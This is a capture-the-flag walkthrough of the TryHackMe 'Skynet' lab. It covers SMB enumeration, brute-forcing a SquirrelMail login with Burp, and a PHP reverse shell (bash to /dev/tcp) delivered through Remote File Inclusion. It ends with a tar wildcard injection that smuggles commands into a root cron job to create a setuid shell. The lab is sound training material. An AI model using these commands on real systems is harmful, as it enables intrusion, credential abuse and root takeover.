# [Skynet](https://tryhackme.com/room/skynet)

## A vulnerable Terminator themed Linux machine.

### What is Miles password for his emails?

_Enumerate Samba_

1. Perform service enumeration to identify available services and their versions:

```bash
nmap -sV IP
```

[SCREEN01]

2. List available SMB shares without authentication. Access the anonymous share to retrieve files. The `logs/log1.txt` file contains a list of potential passwords. The target username is identified as `milesdyson`.

```bash
smbclient -L //IP -N
smbclient //IP/anonymous -N
ls
mget *
cd logs
mget *
```

[SCREEN02]

3. Enumerate web directories to identify additional attack vectors
   - This reveals the SquirrelMail login interface at `/squirrelmail/`

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[SCREEN03]

4. Capture the login request from `http://IP/squirrelmail/src/login.php` via burp suite. Send it to the intruder, load the log1.txt password list and begin attack. Search for shortest response

5. Navigate to `http://<TARGET_IP>/squirrelmail/src/login.php`

- Capture the login request using Burp Suite
- Send the captured request to Burp Intruder
- Configure the attack:
  - Target parameter: password field
  - Payload: passwords from `log1.txt`
  - Attack type: Sniper
- Execute the attack and identify successful authentication by analyzing response lengths. The shortest response typically indicates successful authentication.

[SCREEN04]

[SCREEN05]

---

### What is the hidden directory?

1. Access the authenticated SquirrelMail interface at `http://<TARGET_IP>/squirrelmail/src/webmail.php`. Review the most recent email, which contains SMB credentials

- Password: **)s{A&2Z=F^n_E.B`**

[SCREEN06]

2. Use the discovered credentials to access Miles Dyson's private SMB share. Navigate to the notes directory and retrieve important file

```bash
smbclient //IP/milesdyson -U milesdyson
cd notes
get important.txt
```

[SCREEN07]

---

### What is the vulnerability called when you can include a remote file for malicious purposes?

1. The answer is: `Remote File Inclusion`

---

### What is the user flag?

1. Perform directory enumeration on the discovered hidden directory `/45kra24zxs28v3yd/administrator/`

```bash
gobuster dir -u http://IP/45kra24zxs28v3yd/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[SCREEN08]

2. Further enumeration reveals a vulnerable endpoint `http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php`. This endpoint is susceptible to Remote File Inclusion via the `urlConfig` parameter

Create a PHP reverse shell payload. Save this as `shell.php`:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'");
?>
```

Host the malicious file using Python's built-in HTTP server:

```bash
python -m SimpleHTTPServer
```

Configure a netcat listener to catch the reverse shell:

```bash
nc -nvlp 4444
```

Trigger the RFI vulnerability:

```bash
curl "http://IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://IP:8000/shell.php"

```

2. Once the reverse shell is established, retrieve the user flag:

```bash
cat /home/milesdyson/user.txt
```

[SCREEN09]

---

### What is the root flag?

_A recursive call._

1. Upgrade the reverse shell for better functionality. Examine scheduled tasks for privilege escalation opportunities. The vulnerability exists in how tar processes command-line arguments when wildcards are used. By creating files with names that match tar's command-line options, it's possible to execute arbitrary commands.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

cat /etc/crontab
cd /var/www/html
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# Wait for the cron job to execute
/tmp/rootbash -p
ls /root
cat /root/root.txt
```
